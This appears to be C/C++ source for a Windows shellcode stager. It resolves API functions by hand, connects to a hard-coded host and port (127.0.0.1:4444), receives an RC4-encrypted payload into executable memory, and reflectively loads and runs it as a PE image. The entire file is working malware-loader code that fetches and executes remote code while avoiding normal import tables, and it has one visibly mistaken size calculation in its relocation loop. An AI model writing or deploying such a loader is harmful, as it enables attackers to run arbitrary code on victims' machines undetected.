#include <windows.h>
#include <winternl.h>

#include "rc4.cpp"

extern "C" ULONG_PTR GetKernel32Base();
extern "C" ULONG_PTR CustomGetProcAddress(ULONG_PTR moduleBase, const char* funcName);

typedef HMODULE(WINAPI* fnLoadLibraryA)(LPCSTR);
typedef LPVOID(WINAPI* fnVirtualAlloc)(LPVOID, SIZE_T, DWORD, DWORD);
typedef int(WINAPI* fnWSAStartup)(WORD, LPVOID);
typedef UINT_PTR(WINAPI* fnWSASocketA)(int, int, int, LPVOID, int, DWORD);
typedef int(WINAPI* fnConnect)(UINT_PTR, const sockaddr*, int);
typedef int(WINAPI* fnRecv)(UINT_PTR, char*, int, int);
typedef BOOL(WINAPI* fnDllMain)(HINSTANCE, DWORD, LPVOID);

#define RAW_IP   0x7F000001
#define RAW_PORT 4444

extern "C" void ShellcodeEntry() {
    ULONG_PTR kernel32 = GetKernel32Base();
    if (!kernel32) return;

    char strLoadLibrary[] = "LoadLibraryA";
    char strVirtualAlloc[] = "VirtualAlloc";
    char strWs2[] = "ws2_32.dll";
    char strWSAStartup[] = "WSAStartup";
    char strWSASocketA[] = "WSASocketA";
    char strConnect[] = "connect";
    char strRecv[] = "recv";

    fnLoadLibraryA pLoadLibraryA = (fnLoadLibraryA)CustomGetProcAddress(kernel32, strLoadLibrary);
    fnVirtualAlloc pVirtualAlloc = (fnVirtualAlloc)CustomGetProcAddress(kernel32, strVirtualAlloc);
    if (!pLoadLibraryA || !pVirtualAlloc)
        return;

    HMODULE hWs2 = pLoadLibraryA(strWs2);
    if (!hWs2)
        return;

    fnWSAStartup pWSAStartup = (fnWSAStartup)CustomGetProcAddress((ULONG_PTR)hWs2, strWSAStartup);
    fnWSASocketA pWSASocketA = (fnWSASocketA)CustomGetProcAddress((ULONG_PTR)hWs2, strWSASocketA);
    fnConnect pConnect = (fnConnect)CustomGetProcAddress((ULONG_PTR)hWs2, strConnect);
    fnRecv pRecv = (fnRecv)CustomGetProcAddress((ULONG_PTR)hWs2, strRecv);

    char wsaData[400];
    if (pWSAStartup(0x0202, &wsaData) != 0)
        return;

    UINT_PTR s = pWSASocketA(2, 1, 6, NULL, 0, 0);
    if ((UINT_PTR)INVALID_HANDLE_VALUE == s)
        return;

    unsigned int ip = RAW_IP;
    unsigned int net_ip = ((ip & 0xFF000000) >> 24) | ((ip & 0x00FF0000) >> 8) | ((ip & 0x0000FF00) << 8)  | ((ip & 0x000000FF) << 24);
    unsigned short port = RAW_PORT;
    unsigned short net_port = ((port & 0xFF00) >> 8) | ((port & 0x00FF) << 8);

    sockaddr_in targetAddr;
    targetAddr.sin_family = 2;
    targetAddr.sin_port = net_port;
    targetAddr.sin_addr.s_addr = net_ip;

    if (pConnect(s, (sockaddr*)&targetAddr, sizeof(targetAddr)) != 0)
        return;

    unsigned int payloadSize = 0;
    int bytesRead = pRecv(s, (char*)&payloadSize, 4, 0);
    if (bytesRead <= 0 || payloadSize == 0)
        return;

    char* rawBuf = (char*)pVirtualAlloc(NULL, payloadSize, MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!rawBuf)
        return;

    unsigned int totalReceived = 0;
    while (totalReceived < payloadSize)
    {
        int chunk = pRecv(s, rawBuf + totalReceived, payloadSize - totalReceived, 0);
        if (chunk <= 0)
            return;

        totalReceived += chunk;
    }

    RC4Ctx ctx;
    _init(&ctx, crypto_key(), crypto_keylen());

    _crypt(&ctx, rawBuf, totalReceived);

    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)rawBuf;
    PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)(rawBuf + dosHeader->e_lfanew);

    char* imageBase = (char*)pVirtualAlloc((LPVOID)ntHeaders->OptionalHeader.ImageBase, ntHeaders->OptionalHeader.SizeOfImage, MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!imageBase)
        imageBase = (char*)pVirtualAlloc(NULL, ntHeaders->OptionalHeader.SizeOfImage, MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE);

    if (!imageBase)
        return;

    for (DWORD i = 0; i < ntHeaders->OptionalHeader.SizeOfHeaders; i++)
        imageBase[i] = rawBuf[i];

    PIMAGE_SECTION_HEADER section = IMAGE_FIRST_SECTION(ntHeaders);
    for (WORD i = 0; i < ntHeaders->FileHeader.NumberOfSections; i++)
    {
        if (section[i].SizeOfRawData > 0)
        {
            char* dest = imageBase + section[i].VirtualAddress;
            char* src  = rawBuf   + section[i].PointerToRawData;
            for (DWORD j = 0; j < section[i].SizeOfRawData; j++)
                dest[j] = src[j];
        }
    }

    DWORD importDirRVA = ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress;
    if (importDirRVA)
    {
        PIMAGE_IMPORT_DESCRIPTOR id = (PIMAGE_IMPORT_DESCRIPTOR)(imageBase + importDirRVA);
        while (id->Name)
        {
            HMODULE hLib = pLoadLibraryA((LPCSTR)(imageBase + id->Name));
            if (hLib)
            {
                PIMAGE_THUNK_DATA ti = (PIMAGE_THUNK_DATA)(imageBase + (id->OriginalFirstThunk ? id->OriginalFirstThunk : id->FirstThunk));
                PIMAGE_THUNK_DATA ta = (PIMAGE_THUNK_DATA)(imageBase + id->FirstThunk);
                while (ti->u1.AddressOfData)
                {
                    if (IMAGE_SNAP_BY_ORDINAL(ti->u1.Ordinal))
                    {
                        ta->u1.Function = CustomGetProcAddress((ULONG_PTR)hLib, (LPCSTR)IMAGE_ORDINAL(ti->u1.Ordinal));
                    }
                    else
                    {
                        PIMAGE_IMPORT_BY_NAME ibn = (PIMAGE_IMPORT_BY_NAME)(imageBase + ti->u1.AddressOfData);
                        ta->u1.Function = CustomGetProcAddress((ULONG_PTR)hLib, (LPCSTR)ibn->Name);
                    }

                    ti++; ta++;
                }
            }

            id++;
        }
    }

    LONG_PTR delta = (LONG_PTR)(imageBase - (char*)ntHeaders->OptionalHeader.ImageBase);
    DWORD relocDirRVA = ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress;
    if (delta && relocDirRVA)
    {
        PIMAGE_BASE_RELOCATION reloc = (PIMAGE_BASE_RELOCATION)(imageBase + relocDirRVA);
        while (reloc->SizeOfBlock)
        {
            DWORD count = (reloc->SizeOfBlock - sizeof(PIMAGE_BASE_RELOCATION)) / sizeof(WORD);
            WORD* entry = (WORD*)((char*)reloc + sizeof(PIMAGE_BASE_RELOCATION));
            for (DWORD i = 0; i < count; i++)
            {
                if ((entry[i] >> 12) == 3)
                {
                    *(DWORD*)(imageBase + reloc->VirtualAddress + (entry[i] & 0xFFF)) += (DWORD)delta;
                }
            }

            reloc = (PIMAGE_BASE_RELOCATION)((char*)reloc + reloc->SizeOfBlock);
        }
    }

    if (ntHeaders->OptionalHeader.AddressOfEntryPoint)
    {
        fnDllMain ep = (fnDllMain)(imageBase + ntHeaders->OptionalHeader.AddressOfEntryPoint);
        ep((HINSTANCE)imageBase, 1, NULL);
    }
}